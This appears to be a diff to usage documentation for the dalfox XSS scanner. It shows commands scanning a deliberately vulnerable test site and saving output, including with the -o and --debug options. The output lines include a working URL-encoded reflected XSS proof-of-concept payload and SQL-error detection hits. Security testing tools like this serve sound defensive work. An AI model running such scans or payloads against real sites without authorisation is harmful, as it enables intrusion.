@@ -9,7 +9,7 @@ Command
 $ dalfox url http://testphp.vulnweb.com/listproducts.php | grep "\[V\]" | cut -d " " -f2 | xargs -I % open %
 ```
 
-## Save only PoC code
+## Save only PoC code with Stdout
 Command
 ```
 $ dalfox url http://testphp.vulnweb.com/listproducts.php > output
@@ -25,11 +25,27 @@ $ cat output
 [POC][V][GET] http://testphp.vulnweb.com/listproducts.php?cat=%3CsCriPt+class%3Ddalfox%3Eprompt%2845%29%3C%2Fscript%3E
 ```
 
-## Save all log
+## Save only PoC code with `-o` option
+Command
+```
+$ dalfox url http://testphp.vulnweb.com/listproducts.php -o output
+```
+
+Output file
+```
+$ cat output
+[POC][G][BUILT-IN/dalfox-error-mysql2/GET] http://testphp.vulnweb.com/listproducts.php
+[POC][G][BUILT-IN/dalfox-error-mysql/GET] http://testphp.vulnweb.com/listproducts.php
+[POC][G][BUILT-IN/dalfox-error-mysql5/GET] http://testphp.vulnweb.com/listproducts.php?cat=dalfox.
+[POC][G][BUILT-IN/dalfox-error-mysql1/GET] http://testphp.vulnweb.com/listproducts.php?cat=dalfox.
+[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?cat=%3CsCriPt+class%3Ddalfox%3Eprompt%2845%29%3C%2Fscript%3E
+```
+
+## Save all log (with `-o`, `--debug` option)
 
 Command
 ```
-$ dalfox url http://testphp.vulnweb.com/listproducts.php -o alllog.txt
+$ dalfox url http://testphp.vulnweb.com/listproducts.php -o alllog.txt --debug
 ```
 
 Output file
